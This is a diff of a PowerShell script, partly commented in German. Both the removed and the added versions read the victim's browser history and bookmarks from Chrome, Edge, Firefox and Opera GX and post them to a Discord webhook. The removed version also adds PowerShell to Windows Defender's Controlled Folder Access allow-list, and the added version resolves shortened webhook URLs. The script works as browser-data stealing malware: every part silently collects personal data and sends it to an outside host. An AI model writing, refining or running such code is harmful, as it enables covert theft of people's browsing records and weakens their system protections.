@@ -1,177 +1,48 @@
-# Funktion zum Hinzufügen der PowerShell-Executable zur Liste der zugelassenen Anwendungen im kontrollierten Ordnerzugriff
-function Add-PowerShellToAllowedApps {
-    Add-MpPreference -ControlledFolderAccessAllowedApplications "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+# shortened URL Detection
+if ($whuri.Length -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $whuri = (Invoke-RestMethod -Uri $whuri).url
 }
-
-# Fügen Sie PowerShell zur Liste der zugelassenen Anwendungen hinzu
-Add-PowerShellToAllowedApps
-
-# Set the path to download the SQLite package
-$nugetUrl = "https://api.nuget.org/v3/index.json"
-$packagesDirectory = "$env:TEMP\sqlite-packages"
-$packageName = "System.Data.SQLite.Core"
-$packageVersion = "1.0.114.5"
-
-# Ensure the packages directory exists
-if (-Not (Test-Path -Path $packagesDirectory)) {
-    New-Item -Path $packagesDirectory -ItemType Directory | Out-Null
-}
-
-# Download and install the NuGet package
-function Install-SQLitePackage {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $nugetExe = "$packagesDirectory\nuget.exe"
-    
-    if (-Not (Test-Path -Path $nugetExe)) {
-        Invoke-WebRequest "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile $nugetExe
-    }
-
-    & $nugetExe install $packageName -Version $packageVersion -OutputDirectory $packagesDirectory -Source $nugetUrl
-}
-
-Install-SQLitePackage
-
-# Load the SQLite assembly
-Add-Type -Path "$packagesDirectory\$packageName.$packageVersion\lib\net46\System.Data.SQLite.dll"
-
-# Funktion zum Exportieren des Verlaufs von Chrome und Edge
-function Export-ChromeEdgeHistory {
-    param (
-        [string]$browser,
-        [string]$historyPath,
-        [string]$outputFile
-    )
-    
-    $query = @"
-SELECT 
-    url, 
-    title, 
-    datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit_time 
-FROM 
-    urls 
-ORDER BY 
-    last_visit_time DESC
-"@
-
-    $tempDb = "$env:TEMP\${browser}_History"
-    Copy-Item $historyPath $tempDb -Force
-
-    $connectionString = "Data Source=$tempDb;Version=3;"
-    $connection = New-Object System.Data.SQLite.SQLiteConnection
-    $connection.ConnectionString = $connectionString
-    $connection.Open()
-
-    $command = $connection.CreateCommand()
-    $command.CommandText = $query
-    $reader = $command.ExecuteReader()
-
-    $history = @()
-    while ($reader.Read()) {
-        $history += [PSCustomObject]@{
-            URL = $reader["url"]
-            Title = $reader["title"]
-            LastVisitTime = $reader["last_visit_time"]
-        }
-    }
-
-    $reader.Close()
-    $connection.Close()
-    Remove-Item $tempDb -Force
-
-    $history | Export-Csv -Path $outputFile -NoTypeInformation
-}
-
-# Funktion zum Exportieren des Verlaufs von Firefox
-function Export-FirefoxHistory {
-    param (
-        [string]$historyPath,
-        [string]$outputFile
-    )
-
-    $query = @"
-SELECT 
-    moz_places.url, 
-    moz_places.title, 
-    datetime(moz_historyvisits.visit_date/1000000, 'unixepoch') as visit_date 
-FROM 
-    moz_places, 
-    moz_historyvisits 
-WHERE 
-    moz_places.id = moz_historyvisits.place_id 
-ORDER BY 
-    visit_date DESC
-"@
-
-    $connectionString = "Data Source=$historyPath;Version=3;"
-    $connection = New-Object System.Data.SQLite.SQLiteConnection
-    $connection.ConnectionString = $connectionString
-    $connection.Open()
-
-    $command = $connection.CreateCommand()
-    $command.CommandText = $query
-    $reader = $command.ExecuteReader()
-
-    $history = @()
-    while ($reader.Read()) {
-        $history += [PSCustomObject]@{
-            URL = $reader["url"]
-            Title = $reader["title"]
-            VisitDate = $reader["visit_date"]
-        }
-    }
-
-    $reader.Close()
-    $connection.Close()
-
-    $history | Export-Csv -Path $outputFile -NoTypeInformation
-}
-
-# Funktion zum Senden einer Datei an den Discord Webhook
-function Send-FileToWebhook {
-    param (
-        [string]$filePath,
-        [string]$whuri
-    )
-
-    $fileName = [System.IO.Path]::GetFileName($filePath)
-
-    $form = @{
-        file1 = [System.IO.File]::ReadAllBytes($filePath)
-    }
-
-    Invoke-RestMethod -Uri $whuri -Method Post -Form $form
-}
-
-# Set the output directory to the TEMP folder
-$outputDir = "$env:TEMP"
 
 # Define paths for data storage
-$paths = @{
+$Paths = @{
     'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
     'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
     'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
     'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
 }
 
 # Define browsers and data
-$browsers = @('chrome', 'edge', 'firefox', 'opera')
+$Browsers = @('chrome', 'edge', 'firefox', 'opera')
+$DataValues = @('history', 'bookmarks')
 
-foreach ($browser in $browsers) {
-    $historyPath = $paths["${browser}_history"]
-    $outputFile = "$outputDir\${browser}-history.csv"
-    
-    if ($browser -eq 'firefox') {
-        $profiles = Get-ChildItem -Path $historyPath -Directory
-        foreach ($profile in $profiles) {
-            Export-FirefoxHistory -historyPath $profile.FullName -outputFile $outputFile
-            Send-FileToWebhook -filePath $outputFile -whuri $whuri
-        }
-    } else {
-        if (Test-Path $historyPath) {
-            Export-ChromeEdgeHistory -browser $browser -historyPath $historyPath -outputFile $outputFile
-            Send-FileToWebhook -filePath $outputFile -whuri $whuri
+foreach ($Browser in $Browsers) {
+    foreach ($DataValue in $DataValues) {
+        $PathKey = "${Browser}_${DataValue}"
+        $Path = $Paths[$PathKey]
+
+        if (Test-Path $Path) {
+            try {
+                $fileName = [System.IO.Path]::GetFileName($Path)
+                $fileBytes = [System.IO.File]::ReadAllBytes($Path)
+                $fileBase64 = [Convert]::ToBase64String($fileBytes)
+
+                $body = @{
+                    content = "Browser: $Browser, DataType: $DataValue"
+                    file = $fileBase64
+                }
+
+                Invoke-RestMethod -Uri $whuri -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
+
+                Write-Host "Sent $Path to webhook."
+            } catch {
+                Write-Host "Error sending $Path: $_"
+            }
+        } else {
+            Write-Host "Path not found: $Path"
         }
     }
 }
-
-Write-Host "History export completed. Files sent to webhook: $whuri"
